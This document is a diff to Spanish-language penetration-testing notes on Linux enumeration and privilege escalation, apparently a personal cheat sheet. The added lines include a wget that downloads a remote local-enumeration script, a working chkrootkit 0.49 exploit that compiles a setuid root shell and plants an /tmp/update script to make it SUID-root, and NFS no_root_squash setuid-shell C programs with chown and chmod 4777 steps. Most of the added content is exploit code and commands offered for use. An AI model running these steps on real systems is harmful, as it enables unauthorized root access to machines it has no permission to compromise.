@@ -125,14 +125,67 @@ uname -a
 cat /etc/host
 cat /etc/group
 cat /etc/resolv.conf
-sudo -l Para ver si el usuario puede ejecutar algo como root
-find / -perm -4000 -ls 2> /dev/null // Para buscar ficheros con SUID activado
-To see every process running as root (real & effective ID) in user format:
-          ps -U root -u root u
 ps -xaf // Enumerar procesos en ejecución
 service --status-all
 grep -vE "nologin|false" /etc/passwd // Obtener usuarios que pueden hacer login en la máquina
 
 **Elevación de privilegios**
 sudo su // Probar si el usuario tiene permisos de root
+sudo -l Para ver si el usuario puede ejecutar algo como root
+find / -perm -4000 -ls 2> /dev/null // Para buscar ficheros con SUID activado
+To see every process running as root (real & effective ID) in user format:
+          ps -U root -u root u
+wget https://highon.coffee/downloads/linux-local-enum.sh
 
+
+----------------------------------------
+Si la versión de chkrootkit es vulnerable (/etc/chkrootkit/chkrootkit -V == 0.49) =>
+	cat << EOF > rootme.c
+	> int main(void)
+	> {
+	>     setgid(0);
+	>     setuid(0);
+	>     execl("/bin/sh", "sh", 0);
+	> }
+	> EOF
+Compilamos y guardamos en /tmp
+
+Y luego en /tmp creamos el archivo update que se ejecutará como root
+	cat << EOF > update
+	> #!/bin/bash
+	> chown root /tmp/rootme ; chgrp root /tmp/rootme ; chmod u+s /tmp/rootme
+	> EOF
+
+Finalmente ejecutamos rootme y obtenemos shell root
+----------------------------------------
+Con NFS no_root_squash ->
+
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+
+int main() {
+
+	setuid(0);
+	setgid(0);
+	system("/bin/bash");
+	return 0;
+}
+
+#include <sys/types.h>
+#include <unistd.h>
+
+int main() {
+
+setuid(0);
+setgid(0);
+system("/bin/sh");
+return 0;
+
+}
+
+Ponerle propietario root y SUID desde nuestro terminal, no la shell
+chown root:root archivo
+chmod 4777 archivo
+Ejecutarlo
+----------------------------------------
